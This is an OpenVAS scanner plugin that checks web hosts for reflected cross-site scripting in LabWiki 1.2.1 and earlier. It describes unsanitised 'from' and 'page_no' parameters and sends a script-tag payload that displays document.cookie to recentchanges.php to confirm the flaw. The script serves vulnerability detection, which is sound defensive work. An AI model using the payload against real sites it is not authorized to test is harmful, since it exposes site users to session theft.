##############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_labwiki_mult_xss_vuln.nasl 12 2013-10-27 11:15:33Z jan $
#
# LabWiki Multiple Cross Site Scripting (XSS) Vulnerabilities
#
# Authors:
# Madhuri D <dmadhuri@secpod.com>
#
# Copyright:
# Copyright (c) 2012 Greenbone Networks GmbH, http://www.greenbone.net
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

include("revisions-lib.inc");
tag_impact = "Successful exploitation will allow remote attackers to execute arbitrary HTML
  and script code in a user's browser session in context of an affected website.
  Impact Level: Application";
tag_affected = "LabWiki version 1.2.1 and prior";

tag_insight = "Input passed to the 'from' parameter in index.php and to the 'page_no'
  parameter in recentchanges.php is not properly sanitised before being
  returned to the user.";
tag_solution = "No solution or patch is available as of 27th August, 2012. Information
  regarding this issue will be updated once the solution details are available.
  For updates refer to http://www.bioinformatics.org/phplabware/labwiki/index.php";
tag_summary = "This host is running LabWiki and is prone to multiple cross site
  scripting vulnerabilities.";

if(description)
{
  script_id(802956);
  script_version("$Revision: 12 $");
  script_tag(name:"cvss_base", value:"4.3");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:M/Au:N/C:N/I:P/A:N");
  script_tag(name:"risk_factor", value:"Medium");
  script_tag(name:"last_modification", value:"$Date: 2013-10-27 12:15:33 +0100 (Sun, 27 Oct 2013) $");
  script_tag(name:"creation_date", value:"2012-08-27 16:52:41 +0530 (Mon, 27 Aug 2012)");
  script_name("LabWiki Multiple Cross Site Scripting (XSS) Vulnerabilities");
  desc = "
  Summary:
  " + tag_summary + "

  Vulnerability Insight:
  " + tag_insight + "

  Impact:
  " + tag_impact + "
  Affected Software/OS:
  " + tag_affected + "
  Solution:
  " + tag_solution;
  script_xref(name : "URL" , value : "http://www.securityfocus.com/archive/1/523960");
  script_xref(name : "URL" , value : "http://seclists.org/fulldisclosure/2012/Aug/262");
  script_xref(name : "URL" , value : "http://packetstormsecurity.org/files/115801/LabWiki-1.5-Cross-Site-Scripting.html");

  script_description(desc);
  script_summary("Check if LabWiki is vulnerable to XSS");
  script_category(ACT_ATTACK);
  script_copyright("Copyright (c) 2012 Greenbone Networks GmbH");
  script_family("Web application abuses");
  script_require_ports("Services/www", 80);
  if (revcomp(a: OPENVAS_VERSION, b: "6.0+beta5") >= 0) {
    script_tag(name : "insight" , value : tag_insight);
    script_tag(name : "solution" , value : tag_solution);
    script_tag(name : "summary" , value : tag_summary);
    script_tag(name : "impact" , value : tag_impact);
    script_tag(name : "affected" , value : tag_affected);
  }
  exit(0);
}


include("http_func.inc");
include("http_keepalive.inc");

## Variable Initialization
port = 0;
sndReq = "";
rcvRes = "";
url = "";

## Get HTTP Port
port = get_http_port(default:80);
if(!get_port_state(port)){
  exit(0);
}

## Check Host Supports PHP
if(!can_host_php(port:port)){
  exit(0);
}

## Iterate over the possible paths
foreach dir (make_list("", "/wiki", "/labwiki", "/LabWiki", cgi_dirs()))
{
  sndReq = http_get(item:string(dir, "/index.php"), port:port);
  rcvRes = http_keepalive_send_recv(port:port, data:sndReq);

  ## Confirm the application
  if(rcvRes && '>My Lab</a' >< rcvRes && '>What is Wiki</' >< rcvRes)
  {
    url = string(dir, '/recentchanges.php?page_no="><script>alert(document.cookie)</script>');

    ## Try attack and check the response to confirm vulnerability
    if(http_vuln_check(port:port, url:url, pattern:"><script>alert" +
                       "\(document.cookie\)</script>", check_header:TRUE,
                        extra_check:">What is Wiki<"))
    {
      security_warning(port);
      exit(0);
    }
  }
}
